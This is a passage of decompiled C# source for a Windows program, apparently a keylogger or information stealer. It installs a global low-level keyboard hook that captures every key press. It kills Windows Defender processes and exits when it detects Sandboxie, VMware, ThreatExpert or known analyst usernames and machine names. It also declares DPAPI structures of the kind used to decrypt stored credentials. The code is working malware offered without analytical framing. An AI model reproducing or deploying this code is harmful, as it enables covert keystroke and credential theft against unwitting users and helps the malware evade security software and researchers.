                goto label_4;
              case 6:
                goto label_5;
              case 7:
              case 8:
              case 10:
                goto label_7;
              case 9:
                goto label_6;
              case 11:
                goto label_8;
              case 12:
              case 13:
              case 15:
                goto label_10;
              case 14:
                goto label_9;
              case 16:
                goto label_11;
              case 17:
              case 18:
              case 20:
                goto label_13;
              case 19:
                goto label_12;
              case 21:
                goto label_14;
              case 22:
              case 23:
              case 25:
                goto label_16;
              case 24:
                goto label_15;
              case 26:
                goto label_23;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_18;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_23:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void Timer6_Tick(object sender, EventArgs e)
    {
    }

    public class KeyboardHook
    {
      private const int HC_ACTION = 0;
      private const int WH_KEYBOARD_LL = 13;
      private const int WM_KEYDOWN = 256;
      private const int WM_KEYUP = 257;
      private const int WM_SYSKEYDOWN = 260;
      private const int WM_SYSKEYUP = 261;
      private static int KeyHook;
      private static Form1.KeyboardHook.KeyboardProcDelegate KeyHookDelegate;

      [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int SetWindowsHookEx(
        int idHook,
        Form1.KeyboardHook.KeyboardProcDelegate lpfn,
        int hmod,
        int dwThreadId);

      [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int CallNextHookEx(
        int hHook,
        int nCode,
        int wParam,
        Form1.KeyboardHook.KBDLLHOOKSTRUCT lParam);

      [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int UnhookWindowsHookEx(int hHook);

      public static event Form1.KeyboardHook.KeyDownEventHandler KeyDown;

      public static event Form1.KeyboardHook.KeyUpEventHandler KeyUp;

      public KeyboardHook()
      {
        Form1.KeyboardHook.KeyHookDelegate = new Form1.KeyboardHook.KeyboardProcDelegate(Form1.KeyboardHook.KeyboardProc);
        Form1.KeyboardHook.KeyHook = Form1.KeyboardHook.SetWindowsHookEx(13, Form1.KeyboardHook.KeyHookDelegate, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
      }

      private static int KeyboardProc(
        int nCode,
        int wParam,
        ref Form1.KeyboardHook.KBDLLHOOKSTRUCT lParam)
      {
        if (nCode == 0)
        {
          switch (wParam)
          {
            case 256:
            case 260:
              Form1.KeyboardHook.KeyDownEventHandler keyDownEvent = Form1.KeyboardHook.KeyDownEvent;
              if (keyDownEvent != null)
              {
                keyDownEvent((Keys) lParam.vkCode);
                break;
              }
              break;
            case 257:
            case 261:
              Form1.KeyboardHook.KeyUpEventHandler keyUpEvent = Form1.KeyboardHook.KeyUpEvent;
              if (keyUpEvent != null)
              {
                keyUpEvent((Keys) lParam.vkCode);
                break;
              }
              break;
          }
        }
        return Form1.KeyboardHook.CallNextHookEx(Form1.KeyboardHook.KeyHook, nCode, wParam, lParam);
      }

      ~KeyboardHook()
      {
        Form1.KeyboardHook.UnhookWindowsHookEx(Form1.KeyboardHook.KeyHook);
        // ISSUE: explicit finalizer call
        base.Finalize();
      }

      private struct KBDLLHOOKSTRUCT
      {
        public int vkCode;
        public int scancode;
        public int flags;
        public int time;
        public int dwExtraInfo;
      }

      private delegate int KeyboardProcDelegate(
        int nCode,
        int wParam,
        ref Form1.KeyboardHook.KBDLLHOOKSTRUCT lParam);

      public delegate void KeyDownEventHandler(Keys Key);

      public delegate void KeyUpEventHandler(Keys Key);
    }

    public class ant
    {
      [DllImport("user32", EntryPoint = "FindWindowA", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern long FindWindow([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpWindowName);

      public static void mofo()
      {
label_0:
        int num1;
        int num2;
        try
        {
          ProjectData.ClearProjectError();
          num1 = 1;
label_1:
          int num3 = 2;
          Form1.ant.seekit("MSASCui");
label_2:
          num3 = 3;
          Form1.ant.seekit("msmpeng");
label_3:
          num3 = 4;
          Form1.ant.antiSandboxie();
label_4:
          num3 = 5;
          Form1.ant.IsVmWare();
label_5:
          num3 = 6;
          Form1.ant.AntiThreatExpert();
label_6:
          num3 = 7;
          Form1.ant.checkUsername();
label_7:
          num3 = 8;
          Form1.ant.checkComputername();
          goto label_14;
label_9:
          num2 = num3;
          switch (num1)
          {
            case 1:
              int num4 = num2 + 1;
              num2 = 0;
              switch (num4)
              {
                case 1:
                  goto label_0;
                case 2:
                  goto label_1;
                case 3:
                  goto label_2;
                case 4:
                  goto label_3;
                case 5:
                  goto label_4;
                case 6:
                  goto label_5;
                case 7:
                  goto label_6;
                case 8:
                  goto label_7;
                case 9:
                  goto label_14;
              }
              break;
          }
        }
        catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
        {
          ProjectData.SetProjectError(ex);
          goto label_9;
        }
        throw ProjectData.CreateProjectError(-2146828237);
label_14:
        if (num2 == 0)
          return;
        ProjectData.ClearProjectError();
      }

      private static void seekit(string gay1)
      {
        Process[] processes = Process.GetProcesses();
        int index = 0;
        while (index < processes.Length)
        {
          Process process = processes[index];
          if (process.ProcessName.Contains(gay1))
          {
            try
            {
              process.Kill();
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          checked { ++index; }
        }
      }

      private static void checkUsername()
      {
label_0:
        int num1;
        int num2;
        try
        {
          ProjectData.ClearProjectError();
          num1 = 1;
label_1:
          int num3 = 2;
          List<string> stringList = new List<string>();
label_2:
          num3 = 3;
          stringList.Add("UserName");
label_3:
          num3 = 4;
          stringList.Add("User");
label_4:
          num3 = 5;
          stringList.Add("honey");
label_5:
          num3 = 6;
          stringList.Add("sandbox");
label_6:
          num3 = 7;
          stringList.Add("currentuser");
label_7:
          num3 = 8;
          stringList.Add("User");
label_8:
          num3 = 9;
          List<string>.Enumerator enumerator = stringList.GetEnumerator();
          goto label_13;
label_10:
          num3 = 10;
          string current;
          if (Operators.CompareString(Environment.UserName, current, false) != 0)
            goto label_12;
label_11:
          num3 = 11;
          Environment.Exit(0);
label_12:
          num3 = 13;
label_13:
          if (enumerator.MoveNext())
          {
            current = enumerator.Current;
            goto label_10;
          }
          else
          {
            enumerator.Dispose();
            goto label_21;
          }
label_16:
          num2 = num3;
          switch (num1)
          {
            case 1:
              int num4 = num2 + 1;
              num2 = 0;
              switch (num4)
              {
                case 1:
                  goto label_0;
                case 2:
                  goto label_1;
                case 3:
                  goto label_2;
                case 4:
                  goto label_3;
                case 5:
                  goto label_4;
                case 6:
                  goto label_5;
                case 7:
                  goto label_6;
                case 8:
                  goto label_7;
                case 9:
                  goto label_8;
                case 10:
                  goto label_10;
                case 11:
                  goto label_11;
                case 12:
                case 13:
                  goto label_12;
                case 14:
                  goto label_21;
              }
              break;
          }
        }
        catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
        {
          ProjectData.SetProjectError(ex);
          goto label_16;
        }
        throw ProjectData.CreateProjectError(-2146828237);
label_21:
        if (num2 == 0)
          return;
        ProjectData.ClearProjectError();
      }

      private static void checkComputername()
      {
label_0:
        int num1;
        int num2;
        try
        {
          ProjectData.ClearProjectError();
          num1 = 1;
label_1:
          int num3 = 2;
          List<string> stringList = new List<string>();
label_2:
          num3 = 3;
          stringList.Add("ComputerName");
label_3:
          num3 = 4;
          stringList.Add("COMPUTERNAME");
label_4:
          num3 = 5;
          stringList.Add("DELL-D3E62F7E26");
label_5:
          num3 = 6;
          stringList.Add("DWI-9625AC2E275");
label_6:
          num3 = 7;
          stringList.Add("MICHAEL-F156CF7");
label_7:
          num3 = 8;
          List<string>.Enumerator enumerator = stringList.GetEnumerator();
          goto label_12;
label_9:
          num3 = 9;
          string current;
          if (Operators.CompareString(Environment.MachineName, current, false) != 0)
            goto label_11;
label_10:
          num3 = 10;
          Environment.Exit(0);
label_11:
          num3 = 12;
label_12:
          if (enumerator.MoveNext())
          {
            current = enumerator.Current;
            goto label_9;
          }
          else
          {
            enumerator.Dispose();
            goto label_20;
          }
label_15:
          num2 = num3;
          switch (num1)
          {
            case 1:
              int num4 = num2 + 1;
              num2 = 0;
              switch (num4)
              {
                case 1:
                  goto label_0;
                case 2:
                  goto label_1;
                case 3:
                  goto label_2;
                case 4:
                  goto label_3;
                case 5:
                  goto label_4;
                case 6:
                  goto label_5;
                case 7:
                  goto label_6;
                case 8:
                  goto label_7;
                case 9:
                  goto label_9;
                case 10:
                  goto label_10;
                case 11:
                case 12:
                  goto label_11;
                case 13:
                  goto label_20;
              }
              break;
          }
        }
        catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
        {
          ProjectData.SetProjectError(ex);
          goto label_15;
        }
        throw ProjectData.CreateProjectError(-2146828237);
label_20:
        if (num2 == 0)
          return;
        ProjectData.ClearProjectError();
      }

      public static void antiSandboxie()
      {
        if (Process.GetProcessesByName("SbieSvc").Length < 1)
          return;
        Environment.Exit(0);
      }

      public static void IsVmWare()
      {
        string str1 = "VMDragDetectWndClass";
        ref string local1 = ref str1;
        string str2 = (string) null;
        ref string local2 = ref str2;
        if (Form1.ant.FindWindow(ref local1, ref local2) != 0L)
          return;
        Environment.Exit(0);
      }

      private static void AntiThreatExpert()
      {
        if (!Process.GetCurrentProcess().MainModule.FileName.Contains("sample"))
          return;
        Environment.Exit(0);
      }
    }

    [System.Flags]
    public enum CryptProtectPromptFlags
    {
      CRYPTPROTECT_PROMPT_ON_UNPROTECT = 1,
      CRYPTPROTECT_PROMPT_ON_PROTECT = 2,
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct CRYPTPROTECT_PROMPTSTRUCT
    {
      public int cbSize;
      public Form1.CryptProtectPromptFlags dwPromptFlags;
      public IntPtr hwndApp;
      public string szPrompt;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct DATA_BLOB
    {
      public int cbData;
      public IntPtr pbData;
    }
  }
}
